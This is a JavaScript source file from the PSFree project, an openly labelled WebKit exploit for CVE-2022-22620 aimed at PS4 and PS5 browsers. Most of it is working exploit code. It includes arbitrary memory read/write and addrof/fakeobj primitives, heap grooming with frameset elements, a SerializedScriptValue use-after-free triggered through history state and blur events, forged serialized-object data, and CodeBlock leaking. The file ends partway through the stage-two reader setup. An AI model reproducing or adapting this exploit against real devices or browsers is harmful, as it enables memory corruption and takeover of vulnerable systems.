/* Copyright (C) 2025 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

// PSFree is a WebKit exploit using CVE-2022-22620 to gain arbitrary read/write
//
// vulnerable:
// * PS4 [6.00, 10.00)
// * PS5 [1.00, 6.00)
//
// * CelesteBlue from ps4-dev on discord.com
//   * Helped in figuring out the size of WebCore::SerializedScriptValue and
//     its needed offsets on different firmwares.
//   * figured out the range of vulnerable firmwares
// * janisslsm from ps4-dev on discord.com
//   * Helped in figuring out the size of JSC::ArrayBufferContents and its
//     needed offsets on different firmwares.
// * Kameleon_ from ps4-dev on discord.com - tester
// * SlidyBat from PS5 R&D discord.com
//   * Helped in figuring out the size of JSC::ArrayBufferContents and its
//     needed offsets on different firmwares (PS5).

// Lapse is a kernel exploit for PS4 [5.00, 12.50) and PS5 [1.00-10.20). It
// takes advantage of a bug in aio_multi_delete(). Take a look at the comment
// at the race_one() function here for a brief summary.

// debug comment legend:
// * PANIC - code will make the system vulnerable to a kernel panic or it will
//   perform a operation that might panic
// * RESTORE - code will repair kernel panic vulnerability
// * MEMLEAK - memory leaks that our code will induce

// WebKit offsets start
// offsets for JSC::JSObject
const off_js_cell = 0;
const off_js_butterfly = 0x8;
// start of the array of inline properties (JSValues)
const off_js_inline_prop = 0x10;
// sizeof JSC::JSObject
const off_size_jsobj = 0x10;
// offsets for JSC::JSArrayBufferView
const off_view_m_vector = 0x10;
const off_view_m_length = 0x18;
const off_view_m_mode = 0x1c;
// sizeof JSC::JSArrayBufferView
const off_size_view = 0x20;
// offsets for WTF::StringImpl
const off_strimpl_strlen = 4;
const off_strimpl_m_data = 8;
const off_strimpl_inline_str = 0x14;
// sizeof WTF::StringImpl
const off_size_strimpl = 0x18;
// offsets for WebCore::JSHTMLTextAreaElement, subclass of JSObject
// offset to m_wrapped, pointer to a DOM object
// for this class, it's a WebCore::HTMLTextAreaElement pointer
const off_jsta_impl = 0x18;
// sizeof WebCore::JSHTMLTextAreaElement
const off_size_jsta = 0x20;
// WebKit offsets end
// size of the buffer used by setcontext/getcontext (see module/chain.mjs)
const off_context_size = 0xc8;

function isIntegerFix(x) {
  if (typeof x !== 'number') return 0;
  if (!isFinite(x)) return 0;
  if (Math.floor(x) !== x) return 0;
  return 1;
}

function check_not_in_range(x) {
  if (typeof x !== 'number') return 1;
  if (!isFinite(x)) return 1;
  if (Math.floor(x) !== x) return 1;
  if (x < (-0x80000000)) return 1;
  if (x > 0xffffffff) return 1;
  return 0;
}

// use this if you want to support objects convertible to Int but only need
// their low/high bits. creating a Int is slower compared to just using this
// function
function lohi_from_one(low) {
  if (low instanceof Int) {
    return low._u32.slice();
  }
  if (check_not_in_range(low)) {
    throw TypeError(`low not a 32-bit integer: ${low}`);
  }
  return [low >>> 0, low < 0 ? -1 >>> 0 : 0];
}

// immutable 64-bit integer
class Int {
  constructor(low, high) {
    if (high === undefined) {
      this._u32 = new Uint32Array(lohi_from_one(low));
      return;
    }
    if (check_not_in_range(low)) {
      throw TypeError(`low not a 32-bit integer: ${low}`);
    }
    if (check_not_in_range(high)) {
      throw TypeError(`high not a 32-bit integer: ${high}`);
    }
    this._u32 = new Uint32Array([low, high]);
  }
  get lo() {
    return this._u32[0];
  }
  get hi() {
    return this._u32[1];
  }
  // return low/high as signed integers
  get bot() {
    return this._u32[0] | 0;
  }
  get top() {
    return this._u32[1] | 0;
  }
  neg() {
    const u32 = this._u32;
    const low = (~u32[0] >>> 0) + 1;
    return new this.constructor(
      low >>> 0,
      ((~u32[1] >>> 0) + (low > 0xffffffff)) >>> 0
    );
  }
  eq(b) {
    const values = lohi_from_one(b);
    const u32 = this._u32;
    return (
      u32[0] === values[0]
      && u32[1] === values[1]
    );
  }
  ne(b) {
    return !this.eq(b);
  }
  add(b) {
    const values = lohi_from_one(b);
    const u32 = this._u32;
    const low = u32[0] + values[0];
    return new this.constructor(
        low >>> 0,
        (u32[1] + values[1] + (low > 0xffffffff)) >>> 0
    );
  }
  sub(b) {
    const values = lohi_from_one(b);
    const u32 = this._u32;
    const low = u32[0] + (~values[0] >>> 0) + 1;
    return new this.constructor(
      low >>> 0,
      (u32[1] + (~values[1] >>> 0) + (low > 0xffffffff)) >>> 0
    );
  }
  toString(is_pretty=false) {
    if (!is_pretty) {
      const low = this.lo.toString(16).padStart(8, '0');
      const high = this.hi.toString(16).padStart(8, '0');
      return '0x' + high + low;
    }
    let high = this.hi.toString(16).padStart(8, '0');
    high = high.substring(0, 4) + '_' + high.substring(4);
    let low = this.lo.toString(16).padStart(8, '0');
    low = low.substring(0, 4) + '_' + low.substring(4);
    return '0x' + high + '_' + low;
  }
}

let mem = null;
// cache some constants
const off_vector = off_view_m_vector / 4;
const off_vector2 = (off_view_m_vector + 4) / 4;

function init_module(memory) {
  mem = memory;
}

function add_and_set_addr(mem, offset, base_lo, base_hi) {
  const values = lohi_from_one(offset);
  const main = mem._main;
  const low = base_lo + values[0];
  // no need to use ">>> 0" to convert to unsigned here
  main[off_vector] = low;
  main[off_vector2] = base_hi + values[1] + (low > 0xffffffff);
}

class Addr extends Int {
  read8(offset) {
    const m = mem;
    if (isIntegerFix(offset) && 0 <= offset && offset <= 0xffffffff) {
      m._set_addr_direct(this);
    } else {
      add_and_set_addr(m, offset, this.lo, this.hi);
      offset = 0;
    }
    return m.read8_at(offset);
  }
  read16(offset) {
    const m = mem;
    if (isIntegerFix(offset) && 0 <= offset && offset <= 0xffffffff) {
      m._set_addr_direct(this);
    } else {
      add_and_set_addr(m, offset, this.lo, this.hi);
      offset = 0;
    }
    return m.read16_at(offset);
  }
  read32(offset) {
    const m = mem;
    if (isIntegerFix(offset) && 0 <= offset && offset <= 0xffffffff) {
      m._set_addr_direct(this);
    } else {
      add_and_set_addr(m, offset, this.lo, this.hi);
      offset = 0;
    }
    return m.read32_at(offset);
  }
  read64(offset) {
    const m = mem;
    if (isIntegerFix(offset) && 0 <= offset && offset <= 0xffffffff) {
      m._set_addr_direct(this);
    } else {
      add_and_set_addr(m, offset, this.lo, this.hi);
      offset = 0;
    }
    return m.read64_at(offset);
  }
  readp(offset) {
    const m = mem;
    if (isIntegerFix(offset) && 0 <= offset && offset <= 0xffffffff) {
      m._set_addr_direct(this);
    } else {
      add_and_set_addr(m, offset, this.lo, this.hi);
      offset = 0;
    }
    return m.readp_at(offset);
  }
  write8(offset, value) {
    const m = mem;
    if (isIntegerFix(offset) && 0 <= offset && offset <= 0xffffffff) {
      m._set_addr_direct(this);
    } else {
      add_and_set_addr(m, offset, this.lo, this.hi);
      offset = 0;
    }
    m.write8_at(offset, value);
  }
  write16(offset, value) {
    const m = mem;
    if (isIntegerFix(offset) && 0 <= offset && offset <= 0xffffffff) {
      m._set_addr_direct(this);
    } else {
      add_and_set_addr(m, offset, this.lo, this.hi);
      offset = 0;
    }
    m.write16_at(offset, value);
  }
  write32(offset, value) {
    const m = mem;
    if (isIntegerFix(offset) && 0 <= offset && offset <= 0xffffffff) {
      m._set_addr_direct(this);
    } else {
      add_and_set_addr(m, offset, this.lo, this.hi);
      offset = 0;
    }
    m.write32_at(offset, value);
  }
  write64(offset, value) {
    const m = mem;
    if (isIntegerFix(offset) && 0 <= offset && offset <= 0xffffffff) {
      m._set_addr_direct(this);
    } else {
      add_and_set_addr(m, offset, this.lo, this.hi);
      offset = 0;
    }
    m.write64_at(offset, value);
  }
}

// expected:
// * main - Uint32Array whose m_vector points to worker
// * worker - DataView
// addrof()/fakeobj() expectations:
// * obj - has a "addr" property and a 0 index.
// * addr_addr - Int, the address of the slot of obj.addr
// * fake_addr - Int, the address of the slot of obj[0]
// a valid example for "obj" is "{addr: null, 0: 0}". note that this example
// has [0] be 0 so that the butterfly's indexing type is ArrayWithInt32. this
// prevents the garbage collector from incorrectly treating the slot's value as
// a JSObject and then crash
// the relative read/write methods expect the offset to be a unsigned 32-bit
// integer
class Memory {
  constructor(main, worker, obj, addr_addr, fake_addr) {
    this._main = main;
    this._worker = worker;
    this._obj = obj;
    this._addr_low = addr_addr.lo;
    this._addr_high = addr_addr.hi;
    this._fake_low = fake_addr.lo;
    this._fake_high = fake_addr.hi;
    main[off_view_m_length / 4] = 0xffffffff;
    init_module(this);
    const off_mvec = off_view_m_vector;
    // use this to create WastefulTypedArrays to avoid a GC crash
    const buf = new ArrayBuffer(0);
    const src = new Uint8Array(buf);
    const sset = new Uint32Array(buf);
    const sset_p = this.addrof(sset);
    sset_p.write64(off_mvec, this.addrof(src).add(off_mvec));
    sset_p.write32(off_view_m_length, 3);
    this._cpysrc = src;
    this._src_setter = sset;
    const dst = new Uint8Array(buf);
    const dset = new Uint32Array(buf);
    const dset_p = this.addrof(dset);
    dset_p.write64(off_mvec, this.addrof(dst).add(off_mvec));
    dset_p.write32(off_view_m_length, 3);
    dset[2] = 0xffffffff;
    this._cpydst = dst;
    this._dst_setter = dset;
  }
  // dst and src may overlap
  cpy(dst, src, len) {
    if (!(isIntegerFix(len) && 0 <= len && len <= 0xffffffff)) {
      throw TypeError('len not a unsigned 32-bit integer');
    }
    const dvals = lohi_from_one(dst);
    const svals = lohi_from_one(src);
    const dset = this._dst_setter;
    const sset = this._src_setter;
    dset[0] = dvals[0];
    dset[1] = dvals[1];
    sset[0] = svals[0];
    sset[1] = svals[1];
    sset[2] = len;
    this._cpydst.set(this._cpysrc);
  }
  // allocate Garbage Collector managed memory. returns [address_of_memory,
  // backer]. backer is the JSCell that is keeping the returned memory alive,
  // you can drop it once you have another GC object reference the address.
  // the backer is an implementation detail. don't use it to mutate the
  // memory
  gc_alloc(size) {
    if (!isIntegerFix(size)) { throw TypeError('size not a integer'); }
    if (size < 0) { throw RangeError('size is negative'); }
    const fastLimit = 1000;
    size = ((size + 7) & ~7) >> 3;
    if (size > fastLimit) { throw RangeError('size is too large'); }
    const backer = new Float64Array(size);
    return [mem.addrof(backer).readp(off_view_m_vector), backer];
  }
  fakeobj(addr) {
      const values = lohi_from_one(addr);
      const worker = this._worker;
      const main = this._main;
      main[off_vector] = this._fake_low;
      main[off_vector2] = this._fake_high;
      worker.setUint32(0, values[0], true);
      worker.setUint32(4, values[1], true);
      return this._obj[0];
  }
  addrof(object) {
      // typeof considers null as a object. blacklist it as it isn't a
      // JSObject
      if (object === null
          || (typeof object !== 'object' && typeof object !== 'function')
      ) {
          throw TypeError('argument not a JS object');
      }
      const obj = this._obj;
      const worker = this._worker;
      const main = this._main;
      obj.addr = object;
      main[off_vector] = this._addr_low;
      main[off_vector2] = this._addr_high;
      const res = new Addr(
          worker.getUint32(0, true),
          worker.getUint32(4, true)
      );
      obj.addr = null;
      return res;
  }
  // expects addr to be a Int
  _set_addr_direct(addr) {
      const main = this._main;
      main[off_vector] = addr.lo;
      main[off_vector2] = addr.hi;
  }
  set_addr(addr) {
      const values = lohi_from_one(addr);
      const main = this._main;
      main[off_vector] = values[0];
      main[off_vector2] = values[1];
  }
  get_addr() {
      const main = this._main;
      return new Addr(main[off_vector], main[off_vector2]);
  }
  read8(addr) {
      this.set_addr(addr);
      return this._worker.getUint8(0);
  }
  read16(addr) {
      this.set_addr(addr);
      return this._worker.getUint16(0, true);
  }
  read32(addr) {
      this.set_addr(addr);
      return this._worker.getUint32(0, true);
  }
  read64(addr) {
      this.set_addr(addr);
      const worker = this._worker;
      return new Int(worker.getUint32(0, true), worker.getUint32(4, true));
  }
  // returns a pointer instead of an Int
  readp(addr) {
      this.set_addr(addr);
      const worker = this._worker;
      return new Addr(worker.getUint32(0, true), worker.getUint32(4, true));
  }
  read8_at(offset) {
      if (!isIntegerFix(offset)) {
          throw TypeError('offset not a integer');
      }
      return this._worker.getUint8(offset);
  }
  read16_at(offset) {
      if (!isIntegerFix(offset)) {
          throw TypeError('offset not a integer');
      }
      return this._worker.getUint16(offset, true);
  }
  read32_at(offset) {
      if (!isIntegerFix(offset)) {
          throw TypeError('offset not a integer');
      }
      return this._worker.getUint32(offset, true);
  }
  read64_at(offset) {
      if (!isIntegerFix(offset)) {
          throw TypeError('offset not a integer');
      }
      const worker = this._worker;
      return new Int(
          worker.getUint32(offset, true),
          worker.getUint32(offset + 4, true)
      );
  }
  readp_at(offset) {
      if (!isIntegerFix(offset)) {
          throw TypeError('offset not a integer');
      }
      const worker = this._worker;
      return new Addr(
          worker.getUint32(offset, true),
          worker.getUint32(offset + 4, true)
      );
  }
  write8(addr, value) {
      this.set_addr(addr);
      this._worker.setUint8(0, value);
  }
  write16(addr, value) {
      this.set_addr(addr);
      this._worker.setUint16(0, value, true);
  }
  write32(addr, value) {
      this.set_addr(addr);
      this._worker.setUint32(0, value, true);
  }
  write64(addr, value) {
      const values = lohi_from_one(value);
      this.set_addr(addr);
      const worker = this._worker;
      worker.setUint32(0, values[0], true);
      worker.setUint32(4, values[1], true);
  }
  write8_at(offset, value) {
      if (!isIntegerFix(offset)) {
          throw TypeError('offset not a integer');
      }
      this._worker.setUint8(offset, value);
  }
  write16_at(offset, value) {
      if (!isIntegerFix(offset)) {
          throw TypeError('offset not a integer');
      }
      this._worker.setUint16(offset, value, true);
  }
  write32_at(offset, value) {
      if (!isIntegerFix(offset)) {
          throw TypeError('offset not a integer');
      }
      this._worker.setUint32(offset, value, true);
  }
  write64_at(offset, value) {
      if (!isIntegerFix(offset)) {
          throw TypeError('offset not a integer');
      }
      const values = lohi_from_one(value);
      const worker = this._worker;
      worker.setUint32(offset, values[0], true);
      worker.setUint32(offset + 4, values[1], true);
  }
}

// DataView's accessors are constant time and are faster when doing multi-byte
// accesses but the single-byte accessors are slightly slower compared to just
// indexing the Uint8Array
// to get the best of both worlds, BufferView uses a DataView for multi-byte
// accesses and a Uint8Array for single-byte
// instances of BufferView will their have m_mode set to WastefulTypedArray
// since we use the .buffer getter to create a DataView
class BufferView extends Uint8Array {
  constructor(...args) {
      super(...args);
      this._dview = new DataView(this.buffer, this.byteOffset);
  }
  read8(offset) { return this._dview.getUint8(offset); }
  read16(offset) { return this._dview.getUint16(offset, true); }
  read32(offset) { return this._dview.getUint32(offset, true); }
  read64(offset) {
    return new Int(this._dview.getUint32(offset, true), this._dview.getUint32(offset + 4, true));
  }
  write8(offset, value) { this._dview.setUint8(offset, value); }
  write16(offset, value) { this._dview.setUint16(offset, value, true); }
  write32(offset, value) { this._dview.setUint32(offset, value, true); }
  write64(offset, value) {
    const values = lohi_from_one(value);
    this._dview.setUint32(offset, values[0], true);
    this._dview.setUint32(offset + 4, values[1], true);
  }
}

class DieError extends Error {
  constructor(...args) {
    super(...args);
    this.name = this.constructor.name;
  }
}

function die(msg='') {
  throw new DieError(msg);
}

// alignment must be 32 bits and is a power of 2
function align(a, alignment) {
  if (!(a instanceof Int)) {
    a = new Int(a);
  }
  const mask = -alignment & 0xffffffff;
  let type = a.constructor;
  let low = a.lo & mask;
  return new type(low, a.hi);
}

function hex(number) {
  return '0x' + number.toString(16);
}

// no "0x" prefix
function hex_np(number) {
  return number.toString(16);
}

// expects a byte array
// converted to ES5 supported version
function hexdump(view) {
  var len = view.length;
  var num_16 = len & ~15;
  var residue = len - num_16;
  function chr(i) {
    return (0x20 <= i && i <= 0x7e) ? String.fromCharCode(i) : '.';
  }
  function to_hex(view, offset, length) {
    var out = [];
    for (var i = 0; i < length; i++) {
      var v = view[offset + i];
      var h = v.toString(16);
      if (h.length < 2) h = "0" + h;
      out.push(h);
    }
    return out.join(" ");
  }
  var bytes = [];
  // 16-byte blocks
  for (var i = 0; i < num_16; i += 16) {
    var long1 = to_hex(view, i, 8);
    var long2 = to_hex(view, i + 8, 8);
    var print = "";
    for (var j = 0; j < 16; j++) {
      print += chr(view[i + j]);
    }
    bytes.push([long1 + "  " + long2, print]);
  }
  // residual bytes
  if (residue) {
    var small = residue <= 8;
    var long1_len = small ? residue : 8;
    var long1 = to_hex(view, num_16, long1_len);
    if (small) {
      for (var k = residue; k < 8; k++) {
        long1 += " xx";
      }
    }
    var long2;
    if (small) {
      var arr = [];
      for (var k = 0; k < 8; k++) arr.push("xx");
      long2 = arr.join(" ");
    } else {
      long2 = to_hex(view, num_16 + 8, residue - 8);
      for (var k = residue; k < 16; k++) {
        long2 += " xx";
      }
    }
    var printRem = "";
    for (var k = 0; k < residue; k++) {
      printRem += chr(view[num_16 + k]);
    }
    while (printRem.length < 16) printRem += " ";
    bytes.push([long1 + "  " + long2, printRem]);
  }
  // print screen
  for (var pos = 0; pos < bytes.length; pos++) {
    var off = (pos * 16).toString(16);
    while (off.length < 8) off = "0" + off;
    var row = bytes[pos];
    log(off + " | " + row[0] + " |" + row[1] + "|");
  }
}

// mostly used to yield to the GC. marking is concurrent but collection isn't
// yielding also lets the DOM update. which is useful since we use the DOM for
// logging and we loop when waiting for a collection to occur
function sleep(ms=0) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

let config_target = 0x900;
const KB = 1024;
const MB = KB * KB;
const page_size = 16 * KB; // page size on ps4
// check if we are running on a supported firmware version
// const [is_ps4, version] = (() => {
//   const value = config_target;
//   const is_ps4 = (value & 0x10000) === 0;
//   const version = value & 0xffff;
//   const [lower, upper] = (() => {
//     if (is_ps4) {
//       return [0x600, 0x1000];
//     } else {
//       return [0x100, 0x600];
//     }
//   })();
//   if (!(lower <= version && version < upper)) {
//     throw RangeError(`invalid config_target: ${hex(value)}`);
//   }
//   return [is_ps4, version];
// })();
const is_ps4 = 1;
var ssv_len;
// these constants are expected to be divisible by 2
const num_fsets = 0x180;
const num_spaces = 0x40;
const num_adjs = 8;
const num_reuses = 0x300;
const num_strs = 0x200;
const num_leaks = 0x100;
var rows;
var original_strlen;
const original_loc = location.pathname;

function sread64(str, offset) {
  const low = str.charCodeAt(offset) | (str.charCodeAt(offset + 1) << 8) | (str.charCodeAt(offset + 2) << 16) | (str.charCodeAt(offset + 3) << 24);
  const high = str.charCodeAt(offset + 4) | (str.charCodeAt(offset + 5) << 8) | (str.charCodeAt(offset + 6) << 16) | (str.charCodeAt(offset + 7) << 24);
  return new Int(low, high);
}

function gc() {
  new Uint8Array(4 * MB);
}

class Reader {
  constructor(rstr, rstr_view) {
    this.rstr = rstr;
    this.rstr_view = rstr_view;
    this.m_data = rstr_view.read64(off_strimpl_m_data);
  }
  read8_at(offset) {
    return this.rstr.charCodeAt(offset);
  }
  read32_at(offset) {
    const str = this.rstr;
    return (str.charCodeAt(offset) | (str.charCodeAt(offset + 1) << 8) | (str.charCodeAt(offset + 2) << 16) | (str.charCodeAt(offset + 3) << 24)) >>> 0;
  }
  read64_at(offset) {
    return sread64(this.rstr, offset);
  }
  read64(addr) {
    this.rstr_view.write64(off_strimpl_m_data, addr);
    return sread64(this.rstr, 0);
  }
  set_addr(addr) {
    this.rstr_view.write64(off_strimpl_m_data, addr);
  }
  // remember to use this to fix up the StringImpl before freeing it
  restore() {
    this.rstr_view.write64(off_strimpl_m_data, this.m_data);
    original_strlen = ssv_len - off_size_strimpl;
    this.rstr_view.write32(off_strimpl_strlen, original_strlen);
  }
}
// we will create a JSC::CodeBlock whose m_constantRegisters is set to an array
// of JSValues whose size is ssv_len. the undefined constant is automatically
// added due to reasons such as "undefined is returned by default if the
// function exits without returning anything"
const bt_offset = 0;
var src_part;
//================================================================================================
// LEAK CODE BLOCK ===============================================================================
//================================================================================================
async function leak_code_block(reader, bt_size) {
  const rdr = reader;
  const bt = [];
  // take into account the cell and indexing header of the immutable
  // butterfly
  for (let i = 0; i < bt_size - 0x10; i += 8) {
    bt.push(i);
  }
  // cache the global variable resolution
  var slen = ssv_len;
  var idx_offset = ssv_len - (8 * 3);
  var strs_offset = ssv_len - (8 * 2);
  const bt_part = `var bt = [${bt}];\nreturn bt;\n`;
  const part = bt_part + src_part;
  const cache = [];
  for (let i = 0; i < num_leaks; i++) {
    cache.push(part + `var idx = ${i};\nidx\`foo\`;`);
  }
  var chunkSize;
  if (is_ps4 && (config_target < 0x900))
    chunkSize = 128 * KB;
  else
    chunkSize = 1 * MB;
  const smallPageSize = 4 * KB;
  const search_addr = align(rdr.m_data, chunkSize);
  //log(`search addr: ${search_addr}`);
  //log(`func_src:\n${cache[0]}\nfunc_src end`);
  //log('start find CodeBlock');
  let winning_off = null;
  let winning_idx = null;
  let winning_f = null;
  let find_cb_loop = 0;
  // false positives
  let fp = 0;
  rdr.set_addr(search_addr);
  loop: while (true) {
    const funcs = [];
    for (let i = 0; i < num_leaks; i++) {
      const f = Function(cache[i]);
      // the first call allocates the CodeBlock
      f();
      funcs.push(f);
    }
    for (let p = 0; p < chunkSize; p += smallPageSize) {
      for (let i = p; i < p + smallPageSize; i += slen) {
        if (rdr.read32_at(i + 8) !== 0x11223344) {
          continue;
        }
        rdr.set_addr(rdr.read64_at(i + strs_offset));
        const m_type = rdr.read8_at(5);
        // make sure we're not reading the constant registers of an
        // UnlinkedCodeBlock. those have JSTemplateObjectDescriptors.
        // CodeBlock converts those to JSArrays
        if (m_type !== 0) {
          rdr.set_addr(search_addr);
          winning_off = i;
          winning_idx = rdr.read32_at(i + idx_offset);
          winning_f = funcs[winning_idx];
          break loop;
        }
        rdr.set_addr(search_addr);
        fp++;
      }
    }
    find_cb_loop++;
    gc();
    await sleep();
  }
  //log(`loop ${find_cb_loop} winning_off: ${hex(winning_off)}`);
  //log(`winning_idx: ${hex(winning_idx)} false positives: ${fp}`);
  //log('CodeBlock.m_constantRegisters.m_buffer:');
  rdr.set_addr(search_addr.add(winning_off));
  //for (let i = 0; i < slen; i += 8) {
  //  log(`${rdr.read64_at(i)} | ${hex(i)}`);
  //}
  const bt_addr = rdr.read64_at(bt_offset);
  const strs_addr = rdr.read64_at(strs_offset);
  //log(`immutable butterfly addr: ${bt_addr}`);
  //log(`string array passed to tag addr: ${strs_addr}`);
  //log('JSImmutableButterfly:');
  rdr.set_addr(bt_addr);
  //for (let i = 0; i < bt_size; i += 8) {
  //  log(`${rdr.read64_at(i)} | ${hex(i)}`);
  //}
  //log('string array:');
  rdr.set_addr(strs_addr);
  //for (let i = 0; i < off_size_jsobj; i += 8) {
  //  log(`${rdr.read64_at(i)} | ${hex(i)}`);
  //}
  return [winning_f, bt_addr, strs_addr];
}
//================================================================================================
// MAKE SSV DATA =================================================================================
//================================================================================================
// data to write to the SerializedScriptValue
// setup to make deserialization create an ArrayBuffer with an arbitrary buffer
// address
function make_ssv_data(ssv_buf, view, view_p, addr, size) {
  // sizeof JSC::ArrayBufferContents
  var size_abc;
  if (is_ps4) {
    if (config_target >= 0x900) size_abc = 0x18;
    else size_abc = 0x20;
  } else {
    if (config_target >= 0x300) size_abc = 0x18;
    else size_abc = 0x20;
  }
  const data_len = 9;
  // sizeof WTF::Vector<T>
  const size_vector = 0x10;
  // SSV offsets
  const off_m_data = 8;
  const off_m_abc = 0x18;
  // view offsets
  const voff_vec_abc = 0; // Vector<ArrayBufferContents>
  const voff_abc = voff_vec_abc + size_vector; // ArrayBufferContents
  const voff_data = voff_abc + size_abc;
  // WTF::Vector<unsigned char>
  // write m_data
  // m_buffer
  ssv_buf.write64(off_m_data, view_p.add(voff_data));
  // m_capacity
  ssv_buf.write32(off_m_data + 8, data_len);
  // m_size
  ssv_buf.write64(off_m_data + 0xc, data_len);
  // 6 is the serialization format version number for ps4 6.00. The format
  // is backwards compatible and using a value less than the current version
  // number used by a specific WebKit version is considered valid.
  // See CloneDeserializer::isValid() from
  // WebKit/Source/WebCore/bindings/js/SerializedScriptValue.cpp at PS4 8.0x.
  const CurrentVersion = 6;
  const ArrayBufferTransferTag = 23;
  view.write32(voff_data, CurrentVersion);
  view[voff_data + 4] = ArrayBufferTransferTag;
  view.write32(voff_data + 5, 0);
  // std::unique_ptr<WTF::Vector<JSC::ArrayBufferContents>>
  // write m_arrayBufferContentsArray
  ssv_buf.write64(off_m_abc, view_p.add(voff_vec_abc));
  // write WTF::Vector<JSC::ArrayBufferContents>
  view.write64(voff_vec_abc, view_p.add(voff_abc));
  view.write32(voff_vec_abc + 8, 1);
  view.write32(voff_vec_abc + 0xc, 1);
  if (size_abc === 0x20) {
    // m_destructor, offset 0, leave as 0
    // m_shared, offset 8, leave as 0
    // m_data
    view.write64(voff_abc + 0x10, addr);
    // m_sizeInBytes
    view.write32(voff_abc + 0x18, size);
  } else {
    // m_data
    view.write64(voff_abc + 0, addr);
    // m_destructor (48 bits), offset 8, leave as 0
    // m_shared (48 bits), offset 0xe, leave as 0
    // m_sizeInBytes
    view.write32(voff_abc + 0x14, size);
  }
}
//================================================================================================
// PSFREE STAGE1 PREPARE UAF =====================================================================
//================================================================================================
function prepare_uaf() {
  const fsets = [];
  const indices = [];
  rows = ','.repeat(ssv_len / 8 - 2);
  function alloc_fs(fsets, size) {
    for (let i = 0; i < size / 2; i++) {
      const fset = document.createElement('frameset');
      fset.rows = rows;
      fset.cols = rows;
      fsets.push(fset);
    }
  }
  // the first call to either replaceState/pushState is likely to allocate a
  // JSC::IsoAlignedMemoryAllocator near the SSV it creates. This prevents
  // the SmallLine where the SSV resides from being freed. So we do a dummy
  // call first
  history.replaceState('state0', '');
  alloc_fs(fsets, num_fsets);
  // the "state1" SSVs is what we will UAF
  history.pushState('state1', '', original_loc + '#bar');
  indices.push(fsets.length);
  alloc_fs(fsets, num_spaces);
  history.pushState('state1', '', original_loc + '#foo');
  indices.push(fsets.length);
  alloc_fs(fsets, num_spaces);
  history.pushState('state2', '');
  return [fsets, indices];
}
//================================================================================================
// PSFREE STAGE1 UAF SSV =========================================================================
//================================================================================================
// WebCore::SerializedScriptValue use-after-free
// be careful when accessing history.state since History::state() will get
// called. History will cache the SSV at its m_lastStateObjectRequested if you
// do. that field is a RefPtr, thus preventing a UAF if we cache "state1"
async function uaf_ssv(fsets, index, index2) {
  const views = [];
  const input = document.createElement('input');
  input.id = 'input';
  const foo = document.createElement('input');
  foo.id = 'foo';
  const bar = document.createElement('a');
  bar.id = 'bar';
  //log(`ssv_len: ${hex(ssv_len)}`);
  let pop = null;
  let pop2 = null;
  let pop_promise2 = null;
  let blurs = [0, 0];
  let resolves = [];
  function onpopstate(event) {
    const no_pop = pop === null;
    const idx = no_pop ? 0 : 1;
    //log(`pop ${idx} came`);
    if (blurs[idx] === 0) {
      const r = resolves[idx][1];
      //r(new DieError(`blurs before pop ${idx} came: ${blurs[idx]}`));
      r(new DieError('Blurs before pop came'));
    }
    if (no_pop) {
      pop_promise2 = new Promise((resolve, reject) => {
        resolves.push([resolve, reject]);
        addEventListener('popstate', onpopstate, {once: true});
        history.back();
      });
    }
    if (no_pop) {
      pop = event;
    } else {
      pop2 = event;
    }
    resolves[idx][0]();
  }
  const pop_promise = new Promise((resolve, reject) => {
    resolves.push([resolve, reject]);
    addEventListener('popstate', onpopstate, {once: true});
  });
  function onblur(event) {
    const target = event.target;
    const is_input = target === input;
    const idx = is_input ? 0 : 1;
    //log(`${target.id} blur came`);
    if (blurs[idx] > 0) {
      //die(`${name}: multiple blurs. blurs: ${blurs[idx]}`);
      die('Multiple blurs found');
    }
    // we replace the URL with the original so the user can rerun the
    // exploit via a reload. If we don't, the exploit will append another
    // "#foo" to the URL and the input element will not be blurred because
    // the foo element won't be scrolled to during history.back()
    history.replaceState('state3', '', original_loc);
    // free the SerializedScriptValue's neighbors and thus free the
    // SmallLine where it resides
    const fset_idx = is_input ? index : index2;
    for (let i = fset_idx - num_adjs / 2; i < fset_idx + num_adjs / 2; i++) {
      fsets[i].rows = '';
      fsets[i].cols = '';
    }
    for (let i = 0; i < num_reuses; i++) {
      const view = new Uint8Array(new ArrayBuffer(ssv_len));
      view[0] = 0x41;
      views.push(view);
    }
    blurs[idx]++;
  }
  input.addEventListener('blur', onblur);
  foo.addEventListener('blur', onblur);
  document.body.append(input);
  document.body.append(foo);
  document.body.append(bar);
  // FrameLoader::loadInSameDocument() calls Document::statePopped().
  // statePopped() will defer firing of popstate until we're in the complete
  // state
  // this means that onblur() will run with "state2" as the current history
  // item if we call loadInSameDocument too early
  //log(`readyState now: ${document.readyState}`);
  if (document.readyState !== 'complete') {
    await new Promise(resolve => {
      document.addEventListener('readystatechange', function foo() {
        if (document.readyState === 'complete') {
          document.removeEventListener('readystatechange', foo);
          resolve();
        }
      });
    });
  }
  //log(`readyState now: ${document.readyState}`);
  await new Promise(resolve => {
    input.addEventListener('focus', resolve, {once: true});
    input.focus();
  });
  history.back();
  await pop_promise;
  await pop_promise2;
  //log('done await popstate');
  input.remove();
  foo.remove();
  bar.remove();
  const res = [];
  for (let i = 0; i < views.length; i++) {
    const view = views[i];
    if (view[0] !== 0x41) {
      //log(`view index: ${hex(i)}`);
      //log('found view:');
      //log(view);
      // set SSV's refcount to 1, all other fields to 0/NULL
      view[0] = 1;
      view.fill(0, 1);
      if (res.length) {
        res[1] = [new BufferView(view.buffer), pop2];
        break;
      }
      // return without keeping any references to pop, making it GC-able.
      // its WebCore::PopStateEvent will then be freed on its death
      res[0] = new BufferView(view.buffer);
      i = num_reuses - 1;
    }
  }
  if (res.length !== 2) {
    die('Failed SerializedScriptValue UAF');
  }
  return res;
}
//================================================================================================
// PSFREE STAGE2 MAKE RDR ========================================================================
//================================================================================================
// We now have a double free on the fastMalloc heap
async function make_rdr(view) {
  let str_wait = 0;
  const strs = [];
  const u32 = new Uint32Array(1);
  const u8 = new Uint8Array(u32.buffer);
  original_strlen = ssv_len - off_size_strimpl;
  const marker_offset = original_strlen - 4;
  const pad = 'B'.repeat(marker_offset);
  // Clean memory region
